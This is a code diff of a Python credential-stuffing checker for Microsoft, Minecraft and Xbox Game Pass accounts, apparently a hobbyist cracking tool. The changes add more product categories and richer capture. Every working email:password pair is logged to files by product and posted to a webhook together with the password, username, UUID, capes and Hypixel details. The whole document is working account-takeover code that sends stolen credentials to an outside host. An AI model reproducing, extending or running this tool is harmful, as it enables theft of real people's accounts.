@@ -51,7 +51,7 @@ logo = Fore.GREEN + '''
  ░     ░░▒░ ░ ░ ░ ░▒  ░ ░ ▒ ░  ░ ▒ ▒░ ░ ░░   ░ ▒░     ░  ▒    ▒ ░▒░ ░ ░ ░  ░  ░  ▒   ░ ░▒ ▒░ ░ ░  ░  ░▒ ░ ▒░
  ░ ░    ░░░ ░ ░ ░  ░  ░   ▒ ░░ ░ ░ ▒     ░   ░ ░    ░         ░  ░░ ░   ░   ░        ░ ░░ ░    ░     ░░   ░ 
           ░           ░   ░      ░ ░           ░    ░ ░       ░  ░  ░   ░  ░░ ░      ░  ░      ░  ░   ░     
-                                                    ░                       ░                                BETA 2.3 
+                                                    ░                       ░                                BETA 2.5 
                                                     Made by danifusion                                                 \n'''
 
 class Capture:
@@ -114,42 +114,70 @@ class Capture:
 
     def handle(self):
         global hits, minecraft, gamepass, gamepass_ultimate, other
-        hits += 1
         print(Fore.GREEN + f"Hit: {self.name} | {self.email}:{self.password}")
         with open(f"results/{fname}/hits.txt", 'a', encoding='utf-8') as file:
             file.write(f"{self.email}:{self.password}\n")
         if self.account_type == "Minecraft":
             minecraft += 1
+            print(Fore.GREEN + f"Minecraft: {self.email}:{self.password}")
             with open(f"results/{fname}/minecraft.txt", 'a', encoding='utf-8') as file:
                 file.write(f"{self.email}:{self.password}\n")
         elif self.account_type == "Xbox Game Pass":
             gamepass += 1
+            print(Fore.LIGHTGREEN_EX + f"Xbox Game Pass: {self.email}:{self.password}")
             with open(f"results/{fname}/gamepass.txt", 'a', encoding='utf-8') as file:
                 file.write(f"{self.email}:{self.password}\n")
         elif self.account_type == "Xbox Game Pass Ultimate":
             gamepass_ultimate += 1
-            with open(f"results/{fname}/gamepass.txt", 'a', encoding='utf-8') as file:
+            print(Fore.LIGHTGREEN_EX + f"Xbox Game Pass Ultimate: {self.email}:{self.password}")
+            with open(f"results/{fname}/ultimate.txt", 'a', encoding='utf-8') as file:
                 file.write(f"{self.email}:{self.password}\n")
-        elif self.account_type == "Other":
+        elif self.account_type == "Minecraft Bedrock":
             other += 1
-            with open(f"results/{fname}/other.txt", 'a', encoding='utf-8') as file:
-                file.write(f"{self.email}:{self.password} | {self.name}\n")
-        
+            print(Fore.YELLOW + f"Minecraft Bedrock: {self.email}:{self.password}")
+            with open(f"results/{fname}/bedrock.txt", 'a', encoding='utf-8') as file:
+                file.write(f"{self.email}:{self.password}\n")
+        elif self.account_type == "Minecraft Dungeons":
+            other += 1
+            print(Fore.YELLOW + f"Minecraft Dungeons: {self.email}:{self.password}")
+            with open(f"results/{fname}/dungeons.txt", 'a', encoding='utf-8') as file:
+                file.write(f"{self.email}:{self.password}\n")
+        elif self.account_type == "Minecraft Legends":
+            other += 1
+            print(Fore.YELLOW + f"Minecraft Legends: {self.email}:{self.password}")
+            with open(f"results/{fname}/legends.txt", 'a', encoding='utf-8') as file:
+                file.write(f"{self.email}:{self.password}\n")
+    
         # Enviar embed al webhook para cada hit
         if webhook_url:
             embed_data = {
                 "embeds": [{
-                    "title": "New Hit Detected!",
-                    "color": 65280,  # Verde (0x00FF00 en decimal)
+                    "title": "🎉 New Hit Detected! 🎉",
+                    "color": 65280,
                     "fields": [
-                        {"name": "Email", "value": self.email, "inline": True},
-                        {"name": "Password", "value": self.password, "inline": True},
-                        {"name": "Name", "value": self.name, "inline": True},
-                        {"name": "Account Type", "value": self.account_type, "inline": True}
+                        {"name": "Email", "value": self.email, "inline": False},
+                        {"name": "Password", "value": self.password, "inline": False},
+                        {"name": "Username", "value": self.name if self.name != "N/A" else "N/A", "inline": False},
+                        {"name": "UUID", "value": self.uuid if self.uuid != "N/A" else "N/A", "inline": False},
+                        {"name": "Capes", "value": self.capes if self.capes != "N/A" else "None", "inline": False},
+                        {"name": "Account Type", "value": self.account_type, "inline": False}
                     ],
-                    "timestamp": time.strftime('%Y-%m-%dT%H:%M:%S+02:00', time.localtime())  # Formato ISO con zona horaria CEST
+                    "footer": {"text": "Made by danifusion - BETA 2.0"},
+                    "timestamp": time.strftime('%Y-%m-%dT%H:%M:%S+02:00', time.localtime())  # 10:56 AM CEST, 06/09/2025
                 }]
             }
+            # Añadir campos opcionales de Hypixel y Optifine si están disponibles
+            if self.hypixel:
+                embed_data["embeds"][0]["fields"].append({"name": "Hypixel", "value": self.hypixel, "inline": False})
+            if self.level:
+                embed_data["embeds"][0]["fields"].append({"name": "Hypixel Level", "value": self.level, "inline": False})
+            if self.first_login:
+                embed_data["embeds"][0]["fields"].append({"name": "First Login", "value": self.first_login, "inline": False})
+            if self.last_login:
+                embed_data["embeds"][0]["fields"].append({"name": "Last Login", "value": self.last_login, "inline": False})
+            if self.optifine_cape:
+                embed_data["embeds"][0]["fields"].append({"name": "Optifine Cape", "value": self.optifine_cape, "inline": False})
+
             try:
                 response = requests.post(webhook_url, json=embed_data, timeout=10)
                 if response.status_code not in [200, 204]:
@@ -468,7 +496,7 @@ def mc_token(session, uhs, xsts_token):
     return None
 
 def check_mc_and_gamepass(session, email, password, token):
-    global retries, minecraft, gamepass, gamepass_ultimate, other, checked, cpm
+    global retries, minecraft, gamepass, gamepass_ultimate, other, checked, cpm, hits
     tries = 0
     while tries < max_retries:
         try:
@@ -476,10 +504,14 @@ def check_mc_and_gamepass(session, email, password, token):
             if checkrq.status_code == 200:
                 checked += 1
                 cpm += 1
+                hits += 1  # Incrementa hits para cualquier cuenta autenticada
+                print(Fore.GREEN + f"Hit: {email}:{password}")
+                with open(f"results/{fname}/hits.txt", 'a', encoding='utf-8') as f:
+                    f.write(f"{email}:{password}\n")
                 if 'product_game_pass_ultimate' in checkrq.text:
                     gamepass_ultimate += 1
                     print(Fore.LIGHTGREEN_EX + f"Xbox Game Pass Ultimate: {email}:{password}")
-                    with open(f"results/{fname}/gamepass.txt", 'a', encoding='utf-8') as f:
+                    with open(f"results/{fname}/ultimate.txt", 'a', encoding='utf-8') as f:
                         f.write(f"{email}:{password}\n")
                     capture_mc(token, session, email, password, "Xbox Game Pass Ultimate")
                     return True
@@ -507,17 +539,24 @@ def check_mc_and_gamepass(session, email, password, token):
                         others.append("Minecraft Dungeons")
                     if others:
                         other += 1
-                        items = ', '.join(others)
-                        print(Fore.YELLOW + f"Other: {email}:{password} | {items}")
-                        with open(f"results/{fname}/other.txt", 'a', encoding='utf-8') as f:
-                            f.write(f"{email}:{password} | {items}\n")
-                        capture_mc(token, session, email, password, "Other")
+                        if "Minecraft Bedrock" in others:
+                            print(Fore.YELLOW + f"Minecraft Bedrock: {email}:{password}")
+                            with open(f"results/{fname}/bedrock.txt", 'a', encoding='utf-8') as f:
+                                f.write(f"{email}:{password}\n")
+                            capture_mc(token, session, email, password, "Minecraft Bedrock")
+                        if "Minecraft Dungeons" in others:
+                            print(Fore.YELLOW + f"Minecraft Dungeons: {email}:{password}")
+                            with open(f"results/{fname}/dungeons.txt", 'a', encoding='utf-8') as f:
+                                f.write(f"{email}:{password}\n")
+                            capture_mc(token, session, email, password, "Minecraft Dungeons")
+                        if "Minecraft Legends" in others:
+                            print(Fore.YELLOW + f"Minecraft Legends: {email}:{password}")
+                            with open(f"results/{fname}/legends.txt", 'a', encoding='utf-8') as f:
+                                f.write(f"{email}:{password}\n")
+                            capture_mc(token, session, email, password, "Minecraft Legends")
                         return True
                     else:
-                        print(Fore.YELLOW + f"Valid Mail: {email}:{password}")
-                        with open(f"results/{fname}/hits.txt", 'a', encoding='utf-8') as f:
-                            f.write(f"{email}:{password}\n")
-                        capture_mc(token, session, email, password, "Valid Mail")
+                        capture_mc(token, session, email, password, "Hit")  # Hit genérico sin productos
                         return True
             elif checkrq.status_code == 429:
                 print(Fore.YELLOW + f"Rate limit (429) in check_mc_and_gamepass, retrying after delay...")
@@ -737,7 +776,7 @@ def finishedscreen():
             },
             "files": {}
         }
-        for filename in ["hits.txt", "2fa.txt", "minecraft.txt", "gamepass.txt", "other.txt", "bad.txt", "capture.txt"]:
+        for filename in ["hits.txt", "2fa.txt", "minecraft.txt", "gamepass.txt", "ultimate.txt", "bad.txt", "bedrock.txt", "dungeons.txt", "legends.txt", "capture.txt"]:
             file_path = f"results/{fname}/{filename}"
             if os.path.exists(file_path):
                 with open(file_path, 'r', encoding='utf-8') as f:
@@ -836,4 +875,3 @@ def main():
 
 if __name__ == "__main__":
     main()
-
